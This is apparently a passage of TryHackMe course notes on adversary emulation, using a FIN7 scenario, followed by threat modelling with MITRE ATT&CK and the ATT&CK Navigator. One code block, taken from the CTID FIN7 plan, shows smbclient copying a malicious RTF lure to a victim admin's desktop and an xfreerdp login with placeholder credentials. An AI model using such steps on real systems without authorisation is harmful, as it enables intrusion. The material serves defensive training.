their analysis reports, including details of the tests conducted,
findings and recommendations for technical controls, policies,
procedures and awareness training.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/b41e0b64b78018f1cfefa93fbf4aefc7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/b41e0b64b78018f1cfefa93fbf4aefc7.png)

# CTID Adversary Emulation Library

The [Center for Threat-Informed Defense](https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/) is a non-profit research and
development organisation operated by MITRE Engenuity. Its mission is to
promote the practice of threat-informed defence. With this mission, they
have curated an open-source [adversary emulation plan library](https://github.com/center-for-threat-informed-defense/adversary_emulation_library), allowing
organisations to use the plans to evaluate their capabilities against
real-world threats.

The library provides users with two approaches to their
emulation:

- **Full Emulation:** This is a comprehensive approach to emulating a
particular adversary, for example, [APT29](https://attack.mitre.org/groups/G0016/), typically from initial access to
exfiltration. An example of this approach can be found in this [APT29 Adversary Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/6a5b0413dbe2761d2cb08afe2729d6cf9d021ab6/apt29) repository.
- **Micro Emulation:** This approach is more focused, emulating behaviours
across multiple adversaries, such as file access or process injection techniques. You can view existing emulation plans from [CTID micro emulation plans](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/6a5b0413dbe2761d2cb08afe2729d6cf9d021ab6/micro_emulation_plans) on the linked repository.

The Adversary Emulation Process tasks will look at developing an 
emulation plan for an adversary in ways that will utilise some of the 
methodologies discussed here.

**Threat Emulation Process I**

# Scenario

VASEPY Corp is a multi-billion dollar U.S.
 retail establishment who are aware of the numerous cyber threats 
plaguing the retail industry. As a result of the news of a recent breach
 of one of their competitors, executives have become more concerned 
about the company's security posture. They have hired you as a Threat 
Emulation Engineer to plan and execute an adversary emulation exercise based on known threat groups that would target their business.

Developing an internal emulation 
engagement process for an organisation must be iterative, aligned with 
recorded cyber security goals, intelligence-driven, and methodical. 
Security teams can revisit the iterative process, make adjustments where
 fit and improve the exercise while emulating a given adversary. As an 
overview, the process's steps are as follows:

- Define Objectives
- Research Adversary TTPs
- Planning the Threat Emulation Engagement
- Conducting the Emulation
- Concluding and Reporting

## 1. Defining Emulation Objectives

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/68578a8aff10990ec0cb3331d5920aa0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/68578a8aff10990ec0cb3331d5920aa0.png)

This step is 
crucial to ensure the exercise remains focused and
on track. The objectives should be clearly defined, specific, and
measurable. For example, the aim might be to identify how an
attacker could gain access to sensitive data on a particular server or, 
in the case of VASEPY, have to set our objective to identify areas of
protection against credit card fraud and ransomware attacks. The scope
of the exercise should also be clearly defined, including what the 
emulation will target as specific systems and data.

## 2. Research Adversary TTPs

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/9d5d4cd0ba3ac86a3fa138227922b7c4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/9d5d4cd0ba3ac86a3fa138227922b7c4.png)

This step aims to accurately model the 
behaviour of the target adversary so that the emulation team can conduct
 the exercise realistically and practically. It involves gathering as 
much information about the threat and identifying behaviours that can be
 tested based on the set environment. We can break down this process 
into the following steps:

### **2.1. Information Gathering**

This step starts by gathering information about threats you
would be concerned about. This is to avoid instances of selecting
arbitrary and non-concerning adversaries such as [APT41](https://attack.mitre.org/groups/G0096/) that deals with cyber espionage, as opposed to financial fraud. This
information can be gathered from various sources, including threat
intelligence reports, previous attacks, and publicly available
information. More important to note is that as a threat emulation
engineer, you would need to start with internal sources, such as network
owners, CTI analysts, the cyber defence team and system administrators.
These groups will provide information about threats they have seen or
heard about and characterise threats based on threat intelligence reports
and insights from prior incidents.

Using this for our case, we identify that in Vasepy Corp, security teams
are more concerned about financially motivated threat actors that target
retail businesses and utilise ransomware. We can establish a shortlist
of candidate adversaries that can be emulated for this case using the
ATT&CK framework. A quick search provides information about APT
groups such as [FIN6](https://attack.mitre.org/groups/G0037/), [FIN7](https://attack.mitre.org/groups/G0046/) and [FIN8](https://attack.mitre.org/groups/G0061/), which all target retail
organisations and compromise point-of-sale systems.

### **2.2. Select The Emulated Adversary**

With our shortlist of adversaries, we must narrow it down to one we
can emulate. To do so, we can follow a set of critical factors that will
influence our selection.

- **Relevance:** Here, we need to align the adversary to
be selected to the engagement objectives and the company's goals. This
may even include looking at the geographical relevance of particular APTs.
- **Available CTI:** Threat intelligence is vital for
providing trustworthy information about a threat. For a robust emulation
plan, you would need enough reliable resources around the TTPs.
- **TTP Complexity:** Executing
a fruitful emulation plan for complex adversaries who use sophisticated
tools and procedures may take a long time. Here, we must establish whether existing tools
can handle the emulation or whether custom ones are required.
- **Available Resources:** These are primarily in-house
resources that must be provisioned for a smooth operation. Budget, time
and personnel must be allocated appropriately during the emulation
process.

As the Emulation Engineer, you can review these factors,
assessing the shortlist of TTPs against them and narrowing down to the
appropriate selection. Based on our information, we can select FIN7 as
our suitable adversary to emulate, as they target U.S based retail
entities such as Vasepy Corp.

### **2.3. Select The Emulated TTPs**

This step aims to accurately model the behaviour of the target
adversary so that the exercise can be conducted realistically and
practically. The TTPs selected to emulate will drive the rules of
engagement, implementations and operations flow of the emulation.

In the case of the FIN7 APT,
 their TTPs include spear phishing,
social engineering, and watering hole attacks. To select which one to
emulate, we must understand the TTPs to prioritise our selection. We can
 visualise these TTPs using the ATT&CK Navigator and look at the 
specific behaviours the threat group is known to use.

After this, pivoting to CTI resources, such as those listed within
the ATT&CK description, would provide information about how the original TTP was executed. This will be followed by creating a scenario outline for the selected TTP, with appropriate context and sources to fulfil its emulation.

Click to enlarge the image.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/51f3b337c34152a3ffbc3555a85883d5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/51f3b337c34152a3ffbc3555a85883d5.png)

### **2.4. Construct TTP Outline**

The outline aims to drive follow-up threat
 emulation activities, such as explaining the planned emulation 
activities, stating the scope and rules of engagement and how the TTPs 
will be implemented during the exercise. For emulating FIN7, the TTP outline would look similar to the image below:

Click to enlarge the image.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/cbb6a90e29edcaa51069389e164dbb12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/cbb6a90e29edcaa51069389e164dbb12.png)

For continuous emulation exercises, it is 
worth noting that adversary TTPs can change over time, so staying 
up-to-date with the latest threat intelligence is essential. For 
example, FIN7 has been known to alter their TTPs over time, so it is 
crucial to continually gather new information and update the emulation.

**Threat Emulation Process II**

# 3. Planning the Threat Emulation Engagement

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e3d2a526f0bbb46c923ed563e4ca2149.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e3d2a526f0bbb46c923ed563e4ca2149.png)

Since threat emulation involves conducting and mimicking actual
cyber attacks, significant problems may ensue if not properly planned
and coordinated. The issues may include disclosure of private data,
data loss and unplanned system downtime.

Planning the emulation activities through defining the rules of
engagement for the exercise, including communication and approvals, is
vital to avert these risks. Planning also involves determining the
resources needed for the activity, such as personnel, time, and
equipment.

## **3.1 Threat Emulation Plans**

Threat
 Emulation Plans are a collection of resources used to organise and set a
 step-by-step execution of instructions for adversary behaviours based 
on a particular set of TTPs. As discussed in the previous tasks, we can 
find available emulation plans from CTID that capture adversary 
behaviours based on specific scenarios and step-by-step procedures to 
execute the emulation using tools.

A well-defined plan will contain the elements of the threat emulation process as well as the following components:

- **Engagement Objectives:** We have seen that the
objectives are defined at the beginning of the process to
understand the need for threat emulation.
- **Scope:** The departments, users and devices upon
which emulation activities are permitted should be defined
explicitly.
- **Schedule:** The dates and times when the activities
should occur and when deliverables are due should be defined. This helps
avoid conflicts between emulation activities and legitimate business
operations.
- **Rules of Engagement:** The acceptable adversary
behaviour to be emulated must be planned and discussed. This also
includes mitigation actions for any high-risk TTPs used
during the exercise.
- **Permission to Execute:** Explicit written consent
to conduct the emulation activities must be provided by sufficient
authority from the organisation. This helps avoid acting out independently
and risking legal or criminal problems.
- **Communication Plan:** The emulation team and
organisation stakeholders must have a plan to communicate information
concerning the emulation activities. You need to define the
timings, communication channels, and any collaboration efforts
to be included.

## 4. Conducting the Emulation

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/91159be6c8b4f7c307e86f7edf55e853.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/91159be6c8b4f7c307e86f7edf55e853.png)

This step involves carrying out the attack
 using the TTPs identified in the research phase. This step requires 
skilled professionals who can accurately replicate the tactics and 
techniques of the target adversary. The exercise should be conducted 
controlled and safely, and any issues should be addressed immediately.

We
 will not go through a technical implementation of TTPs in this room. 
However, we shall provide a decent breakdown of the process.

During
 the execution of the emulation, some resources would be needed to 
implement the TTPs. This will be your emulation lab, comprising an 
attack platform, an analysis platform used to gather forensic details 
and analyse artefacts and your test systems where the TTPs would be 
deployed.

### **4.1. Planning the Deployment**

As the emulation engineer for VASEPY, we 
can revisit the Research phase tackled in the previous task, where we 
identify the TTPs to emulate for FIN7.  Let's say we wish to emulate the
 Initial Access TTPs. We can use ATT&CK to understand the TTPs and 
map them out using the Navigator. This would be combined with CTI 
resources, such as [Mandiant's FIN7 Evolution Report](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html) and [ESentire FIN7 Report](https://www.esentire.com/security-advisories/notorious-cybercrime-gang-fin7-lands-malware-in-law-firm-using-fake-legal-complaint-against-jack-daniels-owner-brown-forman-inc), outlining how FIN7 used Windows document lures to execute their campaign.

The lab environment needed for the exercise should be effectively set up, and security teams should know their responsibilities.

### **4.2. Implementation of TTP**

This is where the deployment of  actual 
TTPs happens. In our case scenario, an Initial Access payload for FIN7 
would be created and obfuscated using an RTF document, delivered through
 a spear phishing email. The lures used by attackers such as FIN7 tend 
to be convincing using DOCX and RTF files with malicious Windows 
Shortcut File (.LNK) embedded. 

A code snippet demonstrating this execution based on the [CTID FIN7 Emulation plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1#step-1---initial-breach-evaluations-step-11) would look as follows:

Malicious File Execution: T1204.002

```
# Copy 2-list.rtf to <domain_admin> Desktop on hotelmanager.sudo smbclient -U '<domain_full>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put fin7/Resources/Step1/SQLRat/2-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\2-list.rtf"

#Provide <domain_admin> password when prompted.
<domain_admin_password>

#Login to victim workstation as <domain_admin>
xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hotelmanager_ip>
```

### **4.3. Detections & Mitigations**

Since emulation is a cross-team and 
collaborative endeavour, the defence team must find ways to detect and 
mitigate against emulated TTPs. Depending on the organisational setup, 
the SOC would use standard cyber security tools to collect, correlate 
and analyse TTP behaviour and logs for detection. MITRE provides a list 
of mitigation efforts for the adversarial TTPs, and this can be provided
 as recommendations and implemented as part of the emulation. In our 
case, we can look at the [Malicious File T1204.002](https://attack.mitre.org/techniques/T1204/002/) mitigations and detection strategies.

Click to enlarge image.

**Threat Emulation Process III**

# 5. Observe Results

While going through the emulation engagement, the observing team
(typically Blue Team) must identify artefacts that point to the
emulation activity. This will be through the analysis of logs,
evaluation of event logs and tracking of networking traffic.

Additionally, like in the case of FIN7, detection rules would be
vital to detect the threat. One collection of rules useful for this
would be the [YARA rules](https://tryhackme.com/room/yara).
Have a look at the rules to detect the [pillowMint.exe](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/yara-rules/pillowmint.txt)
malware.

The output of these results would help to understand if the TTP was
successful at its mission, blocked or detected by the security measures
available.

# 6. Document & Report Findings

Once results have been obtained, the teams must document and report
the findings. Documentation provides empirical evidence to demonstrate
the cyber security effectiveness of the process.

Reporting should cover the exercise procedures, as outlined in the
emulation plan and what was executed, the impact faced and
recommendations that would be offered to avert the threat.

## **THREAT MODELLING**

# What is Threat Modelling?

Threat modelling is a systematic approach to **identifying, prioritising, and addressing potential security threats** across
 the organisation. By simulating possible attack scenarios and assessing
 the existing vulnerabilities of the organisation's interconnected 
systems and applications, threat modelling enables organisations to 
develop proactive security measures and make informed decisions about 
resource allocation.

Threat modelling aims to reduce an 
organisation's overall risk exposure by identifying vulnerabilities and 
potential attack vectors, allowing for adequate security controls and 
strategies. This process is essential for constructing a robust defence 
strategy against the ever-evolving cyber threat landscape.

# Threat, Vulnerability and Risk

As
 mentioned above, the main goal of threat modelling is to reduce the 
organisation's risk exposure. So before we deep dive into its 
application, let's review first the definitions of **Threat, Vulnerability and Risk**.

| **Type** | **Definition** |
| --- | --- |
| **Threat** | Refers
 to any potential occurrence, event, or actor that may exploit 
vulnerabilities to compromise information confidentiality, integrity, or
 availability. It may come in various forms, such as cyber attacks, 
human error, or natural disasters. |
| **Vulnerability** | A
 weakness or flaw in a system, application, or process that may be 
exploited by a threat to cause harm. It may arise from software bugs, 
misconfiguration, or design flaws. |
| **Risk** | The
 possibility of being compromised because of a threat taking advantage 
of a vulnerability. A way to think about how likely an attack might be 
successful and how much damage it could cause. |

To simplify it, we can use an analogy of an organisation as a house and describe the potential threat, vulnerability and risk.

| **Type** | **Analogy** |
| --- | --- |
| **Threat** | Occurrence of someone breaking inside your home and taking all your belongings. |
| **Vulnerability** | Weaknesses in your home security, such as broken locks or open windows. |
| **Risk** | Likelihood of being burglarised due to living in a neighbourhood with a high crime rate or a lack of an alarm system. |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb02e9d8aff79e0196eb380c771147f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb02e9d8aff79e0196eb380c771147f9.png)

Understanding
 the differences between threat, vulnerability, and risk is essential 
for effective threat modeling. It enables the organisation to 
effectively identify and prioritise security issues, resulting in a 
faster way of reducing risk exposure.

# High-Level Process of Threat Modelling

Before delving into different threat modelling frameworks, let's briefly run through a simplified, high-level process.

1. **Defining the scope**
    
    Identify the specific systems, applications, and networks in the threat modelling exercise.
    
2. **Asset Identification**
    
    Develop diagrams of the organisation's
     architecture and its dependencies. It is also essential to identify the
     importance of each asset based on the information it handles,  such as 
    customer data, intellectual property, and financial information.
    
3. **Identify Threats**
    
    Identify potential threats that may impact
     the identified assets, such as cyber attacks, physical attacks, social 
    engineering, and insider threats.
    
4. **Analyse Vulnerabilities and Prioritise Risks**
    
    Analyse the 
    vulnerabilities based on the potential impact of identified threats in 
    conjunction with assessing the existing security controls. Given the 
    list of vulnerabilities, risks should be prioritised based on their 
    likelihood and impact.
    
5. **Develop and Implement Countermeasures**
    
    Design and implement 
    security controls to address the identified risks, such as implementing 
    access controls, applying system updates, and performing regular 
    vulnerability assessments.
    
6. **Monitor and Evaluate**
    
    Continuously test and monitor the 
    effectiveness of the implemented countermeasures and evaluate the 
    success of the threat modelling exercise. An example of a simple 
    measurement of success is tracking the identified risks that have been 
    effectively mitigated or eliminated.
    

By following these steps, an organisation can conduct a comprehensive
 threat modelling exercise to identify and mitigate potential security 
risks and vulnerabilities in their systems and applications and develop a
 more effective security strategy.

Remember that the example 
above is a generic high-level process; threat modelling frameworks will 
be introduced in the following tasks.

# Collaboration with Different Teams

The
 high-level process discussed above involves many tasks, so it is 
crucial to have multiple teams collaborate. Each unit offers valuable 
skills and expertise, helping improve the organisation's security 
posture. By collaborating, organisations can effectively address and 
align the security efforts needed to build a better defence.

In line with this, we will introduce the teams typically involved in a threat modelling Exercise.

| **Team** | **Role and Purpose** |
| --- | --- |
| **Security Team** | The
 overarching team of red and blue teams. This team typically lead the 
threat modelling process, providing expertise on threats, 
vulnerabilities, and risk mitigation strategies. They also ensure 
security measures are implemented, validated, and continuously 
monitored. |
| **Development Team** | The 
development team is responsible for building secure systems and 
applications. Their involvement ensures that security is always 
incorporated throughout the development lifecycle. |
| **IT and Operations Team** | IT
 and Operations teams manage the organisation's infrastructure, 
including networks, servers, and other critical systems. Their knowledge
 of network infrastructure, system configurations and application 
integrations is essential for effective threat modelling. |
| **Governance, Risk and Compliance Team** | The
 GRC team is responsible for organisation-wide compliance assessments 
based on industry regulations and internal policies. They collaborate 
with the security team to align threat modelling with the organisation's
 risk management objectives. |
| **Business Stakeholders** | The
 business stakeholders provide valuable input on the organisation's 
critical assets, business processes, and risk tolerance. Their 
involvement ensures that the efforts align with the organisation's 
strategic goals. |
| **End Users** | As direct 
users of a system or application, end users can provide unique insights 
and perspectives that other teams may not have, enabling the 
identification of vulnerabilities and risks specific to user 
interactions and behaviours. |

Note
 that the list is not limited to these teams and may vary depending on 
your organisational structure. Moreover, the collaboration of these 
teams is not limited to threat modelling exercises, as they also work 
hand in hand in securing the organisation through different initiatives.

# Attack Trees

In
 addition to the high-level methodology discussed above, creating an 
attack tree is another good way to identify and map threats.

An
 ﻿attack tree is a graphical representation used in threat modelling to 
systematically describe and analyse potential threats against a system, 
application or infrastructure. It provides a structured, hierarchical 
approach to breaking down attack scenarios into smaller components. Each
 node in the tree represents a specific event or condition, with the 
root node representing the attacker's primary goal.

For a 
quick example, let's use the diagram below that represents a scenario of
 an attacker trying to gain unauthorised access to sensitive data stored
 in a cloud-based storage system.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab10d8571dca42dfcab63c952c436413.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab10d8571dca42dfcab63c952c436413.png)

In this diagram, the root node represents the attacker's primary goal: **gain unauthorised access to sensitive data**.
 The first level of child nodes represents different high-level 
strategies an attacker might do to achieve the goal. Each node further 
breaks down into specific steps, detailing the attacker's possible 
techniques and actions.

In addition to the traditional 
hierarchical structure, attack trees can be organised as attack paths, 
which depict the possible routes or sequences of vulnerabilities a 
threat actor can exploit to achieve their goal. Attack paths are 
essentially chains of vulnerabilities that are interconnected.

In
 an attack path representation, the initial starting node represents the
 attacker's entry point into the system or network. From there, the 
various branches or nodes represent the specific vulnerabilities, attack
 vectors, or steps the threat actor can follow to advance towards their 
objective.

**Modelling with MITRE ATT&CK**

After having a good overview of threat modelling concepts, let's start with the first framework of this room - the MITRE ATT&CK Framework.

# MITRE ATT&CK Framework

For a quick refresher, let's define MITRE ATT&CK again.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/831d13f65b445128b6cf96a4dc43b5b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/831d13f65b445128b6cf96a4dc43b5b9.png)

MITRE
 ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a
 comprehensive, globally accessible knowledge base of cyber adversary 
behaviour and tactics. Developed by the MITRE
 Corporation, it is a valuable resource for organisations to understand 
the different stages of cyber attacks and develop effective defences.

The
 ATT&CK framework is organised into a matrix that covers various 
tactics (high-level objectives) and techniques (methods used to achieve 
goals). The framework includes descriptions, examples, and mitigations 
for each technique, providing a detailed overview of threat actors' 
methods and tools.

For a quick example, let's examine one of the techniques in the framework - [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).

As you can see in the provided link, the page contains five significant sections, namely:

1. Technique Name and Details
    
    Information
     such as name, detailed explanation of the technique, types of data or 
    logs that can help or detect, and platforms (Windows, MacOS, Linux) relevant to the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d9026d5ac1c84632ad1e45bd6208e7ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d9026d5ac1c84632ad1e45bd6208e7ae.png)
    
2. Procedure Examples
    
    Real-world examples of how threat actors have employed the technique in their adversarial operations.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218fa71ca2fe34549424b82152c4b5fb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218fa71ca2fe34549424b82152c4b5fb.png)
    
3. **Mitigations**
    
    Recommended security measures and best practices to protect against the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5cb8f4b6f8351efd801b134741e41536.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5cb8f4b6f8351efd801b134741e41536.png)
    
4. Detections
    
    Strategies and indicators that can help identify the technique, as well as potential challenges in detecting the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4a542bb8405b6bdfa0cf814c50f491c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4a542bb8405b6bdfa0cf814c50f491c.png)
    
5. References
    
    External sources, reports, and articles that provide additional information, context, or examples related to the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/40674f569307d70862844c0fcd69d7f5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/40674f569307d70862844c0fcd69d7f5.png)
    

By
 exploring the contents of a MITRE ATT&CK technique page, you may 
gain valuable insights into the specific methods employed by an 
adversary and enhance your organisation's overall security posture by 
implementing the suggested mitigations and detection strategies.

# Applying MITRE ATT&CK in Threat Modelling Process

MITRE
 ATT&CK can be integrated into our threat modelling process by 
mapping the identified threats and vulnerabilities to the tactics and 
techniques described in the ATT&CK Framework. We can insert a new 
entry in our methodology after the "**Identify Threats**" step.

- Identify Threats
    
    Identify
     potential threats that may impact the identified assets, such as cyber 
    attacks, physical attacks, social engineering, and insider threats.
    
- **Map to MITRE ATT&CK**
    
    Map the identified threats to the corresponding tactics and techniques in the MITRE
     ATT&CK Framework. For each mapped technique, utilise the 
    information found on the corresponding ATT&CK technique page, such 
    as the description, procedure examples, mitigations, and detection 
    strategies, to gain a deeper understanding of the threats and 
    vulnerabilities in your system.
    

Incorporating
 the framework in our threat modelling process ensures a comprehensive 
understanding of the potential security threats. It enables a better 
application of countermeasures to reduce the overall risk to your 
organisation.

# Utilising MITRE ATT&CK for Different Use Cases

Aside
 from incorporating MITRE ATT&CK in a threat modelling process, 
MITRE ATT&CK can be used in various cases depending on your 
organisation's needs. To wrap up this task, here is a list of some use 
cases for utilising this framework.

1. Identifying potential attack paths based on your infrastructure
    
    Based
     on your assets, the framework can map possible attack paths an attacker
     might use to compromise your organisation. For example, if your 
    organisation uses Office 365, all techniques attributed to this platform
     are relevant to your threat modelling exercise.
    
2. Developing threat scenarios
    
    MITRE
     ATT&CK has attributed all tactics and techniques to known threat 
    groups. This information can be leveraged to assess your organisation 
    based on threat groups identified to be targeting the same industry.
    
3. Prioritising vulnerability remediation
    
    The information provided for each MITRE
     ATT&CK technique can be used to assess the significant impact that 
    may occur if your organisation experiences a similar attack. Given this,
     your security team can identify the most critical vulnerabilities to 
    address.
    

Note that the usage of this framework is not 
limited to the provided use cases above. It is still under your 
discretion how to utilise the information provided by the framework 
effectively.

**Mapping with ATT&CK Navigator**

# ATT&CK Navigator

Before discussing the ATT&CK Navigator, you may start the machine attached to this room by clicking the **Start Machine** button. Once the machine is up, access the ATT&CK Navigator webpage via the **AttackBox** or **VPN** using this link - [http://MACHINE_IP](http://machine_ip/). You will see this landing page once you access the provided link.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5ae5d848988625b56d014cf8a8ed24fd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5ae5d848988625b56d014cf8a8ed24fd.png)

**Note: This open-source application is also accessible via this [link](https://mitre-attack.github.io/attack-navigator/). However, we will use the provided VM to have consistency in the ATT&CK Navigator version used in this task.**

Now that the web application is running, let's discuss the MITRE ATT&CK Navigator!

The MITRE ATT&CK Navigator is an open-source, web-based tool that helps visualise and navigate the complex landscape of the MITRE
 ATT&CK Framework. It allows security teams to create custom 
matrices by selecting relevant tactics and techniques that apply to 
their specific environment or threat scenario.

This task will have
 a walkthrough on creating a layer and mapping the relevant techniques 
for your threat modelling exercise. Here is a brief overview of the 
steps and features we will utilise.

1. Creation of a new layer.
2. Searching and selecting techniques.
3. Viewing, sorting and filtering layers.
4. Annotating techniques with fills, scores and comments.

# Creating a New Layer

To start with, let's create a new layer and choose enterprise.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b297cc481e64b98e727c0c2bc3c1bb78.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b297cc481e64b98e727c0c2bc3c1bb78.png)

You may have observed that there are three options for creating a new layer. These layers pertain to the three MITRE ATT&CK matrices, namely:

- **Enterprise** - The Enterprise Matrix focuses on threats and techniques commonly used against enterprise networks.
- **Mobile** - The Mobile Matrix focuses on threats and techniques against mobile devices, such as smartphones and tablets.
- **ICS** - The ICS Matrix focuses on threats and techniques against industrial control
systems, which control critical infrastructure, such as power plants,
water treatment facilities, and transportation systems.

We 
have chosen the Enterprise Matrix to cover threat actors' typical 
techniques when targeting an organisation. After creating a new layer, 
you will have this view once the web page has loaded.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d74cd02274b8f09d20cd6b2cf853c2a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d74cd02274b8f09d20cd6b2cf853c2a5.png)

# Searching and Selecting Techniques

The first important feature we want to utilise in this application is the search functionality under the **Selection Controls** panel. This feature allows us to search and multi-select techniques you want to highlight or mark.

You may press the magnifier button to access the right sidebar, search using any keywords, or choose any selection under **Techniques, Threat Groups, Software, Mitigations, Campaigns, or Data Sources**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04d12a47541923fc4a7b1ed229293fa1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04d12a47541923fc4a7b1ed229293fa1.png)

For a quick example, search for **APT41** and hover its entry on the **Threat Groups**
 section. You may observe that it will highlight all techniques 
attributed to this threat group. Once you click the select button, the 
highlighted techniques will be selected as a group and can be annotated 
with a score or a background fill, which will be discussed in the 
following instructions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f11e5b772011876f8255d6abd97a1b1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f11e5b772011876f8255d6abd97a1b1b.png)

After
 selecting the threat group, you may also observe that the deselect 
button now has a numerical value. This indicates the current number of 
chosen techniques. You may press this button to remove all your current technique selections.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9e443200b84f84d93773d6294ed2745e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9e443200b84f84d93773d6294ed2745e.png)

Lastly,
 you may right-click any technique if you prefer to do an action on a 
single technique (e.g. select, add to selection, remove from selection).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/10260d2f4c50533fbc471e86ed6b0bfb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/10260d2f4c50533fbc471e86ed6b0bfb.png)

# Viewing, Sorting and Filtering Layers

We will tackle the next set of features under the **Layer Controls** panel. However, we will only focus on the following:

- Exporting features (download as JSON, Excel, SVG) - This allows you to dump the selected techniques,
including all annotations. The data exported can be ingested again in
the ATT&CK Navigator for future use.
- Filters -
Allows you to filter techniques based on relevant platforms, such as
operating systems or applications. For a quick example, the image below
shows all techniques that are attributed to Office365.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ecfb35e8b4b7784e55d46e0e419980f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ecfb35e8b4b7784e55d46e0e419980f.png)

- Sorting - This allows you to sort the techniques by their alphabetical
arrangement or numerical scores. The image below shows that all
techniques are arranged alphabetically.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c4b5706ce7f8c6cefead64434592760.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c4b5706ce7f8c6cefead64434592760.png)

- Expand sub-techniques - View all underlying sub-techniques under each
technique, expanding the view for all techniques. You will have a
similar view with the image below once you have expanded the
sub-techniques.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57b9e0faedfe675aacbb7e039c2347bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57b9e0faedfe675aacbb7e039c2347bb.png)

# Annotating Techniques

Now, the last set of features is under the **Technique Controls**
 panel. These buttons allow you to annotate details on selected 
techniques. For a quick run-through, here are the features under the 
